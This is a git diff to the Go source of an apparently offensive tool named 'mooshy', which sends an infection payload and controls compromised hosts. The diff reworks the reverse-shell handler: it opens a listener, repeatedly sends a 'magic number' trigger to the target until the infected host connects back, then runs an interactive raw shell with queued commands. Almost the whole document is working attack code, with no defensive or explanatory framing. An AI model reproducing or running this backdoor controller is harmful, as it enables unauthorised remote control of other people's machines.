@@ -174,31 +174,6 @@ func latestMoosh(token string) (string, error) {
 	return "", errors.New("not found")
 }
 
-func pollMagicNumber(conn net.Conn, port string, addr string, connected chan struct{}) error {
-	var i int
-	var timeout time.Duration = 1 * time.Second
-	for i = 0; i < 5; i++ {
-		_, err := conn.Write([]byte(mooshy.MagicNumber + port))
-		if err != nil {
-			log.Fatalf("Failed to send magic number to %s: %s", addr, err)
-		} else if i == 0 {
-			log.Printf("Sent magic number to %s", addr)
-		} else {
-			log.Printf("Resent magic number (waiting %.0f sec)...", timeout.Seconds())
-		}
-
-		time.Sleep(timeout)
-		timeout *= 2
-
-		select {
-		case <-connected:
-			return nil
-		default:
-		}
-	}
-	return fmt.Errorf("Did not receive a connection after %d tries", i)
-}
-
 func runShell(shell io.ReadWriter, cmds ...string) (err error) {
 	cmd := exec.Command("stty", "-echo", "raw")
 	cmd.Stdin = os.Stdin
@@ -430,32 +405,6 @@ func main() {
 
 		log.Printf("Payload sent. Infection may take a while...")
 	default:
-		l, err := net.Listen("tcp4", *tcp)
-		if err != nil {
-			log.Fatalf("Failed to open reverse shell: %s", err)
-		}
-		log.Printf("TCP socket opened on %s", l.Addr())
-
-		conn, err := net.DialTimeout("tcp4", *addr, 5*time.Second)
-		if err != nil {
-			log.Fatalf("Failed to dial %s: %s", *addr, err)
-		}
-
-		_, port, err := net.SplitHostPort(l.Addr().String())
-		if err != nil {
-			log.Fatalf("Failed to parse port from %s: %s", l.Addr(), err)
-		}
-
-		connected := make(chan struct{})
-		go pollMagicNumber(conn, port, *addr, connected)
-		conn, err = l.Accept()
-		if err != nil {
-			log.Fatalf("Failed to accept connection on %s: %s", l.Addr(), err)
-		}
-		close(connected)
-		log.Printf("Received connection from %s", conn.RemoteAddr())
-		defer conn.Close()
-
 		var cmds []string
 		if *pre != "" {
 			cmds = append(cmds, *pre)
@@ -470,8 +419,57 @@ func main() {
 			}...)
 		}
 
-		if err := runShell(conn, cmds...); err != nil {
-			log.Fatalf("Failed to run shell on %s: %s", l.Addr(), err)
+		l, err := net.Listen("tcp4", *tcp)
+		if err != nil {
+			log.Fatalf("Failed to open reverse shell: %s", err)
+		}
+		log.Printf("TCP socket opened on %s", l.Addr())
+
+		_, port, err := net.SplitHostPort(l.Addr().String())
+		if err != nil {
+			log.Fatalf("Failed to parse port from %s: %s", l.Addr(), err)
+		}
+
+		log.Printf("Connecting to %s...", *addr)
+		outConn, err := net.DialTimeout("tcp4", *addr, 5*time.Second)
+		if err != nil {
+			log.Fatalf("Failed to dial %s: %s", *addr, err)
+		}
+		defer outConn.Close()
+
+		ch := make(chan net.Conn, 1)
+		go func() {
+			conn, err := l.Accept()
+			if err != nil {
+				log.Fatalf("Failed to accept connection on %s: %s", l.Addr(), err)
+			}
+			log.Printf("Received connection from %s", conn.RemoteAddr())
+			ch <- conn
+		}()
+
+		for timeout := time.Second; ; timeout *= 2 {
+			if _, err := outConn.Write([]byte(mooshy.MagicNumber + port)); err != nil {
+				log.Printf("Failed to send magic number to %s: %s", *addr, err)
+			} else {
+				log.Printf("Magic number sent, sleeping for %.0f sec...", timeout.Seconds())
+			}
+
+			time.Sleep(timeout)
+
+			var conn net.Conn
+
+			select {
+			case conn = <-ch:
+			default:
+				continue
+			}
+
+			defer conn.Close()
+
+			if err := runShell(conn, cmds...); err != nil {
+				log.Printf("Failed to run shell on %s: %s", l.Addr(), err)
+			}
+			break
 		}
 	}
 }
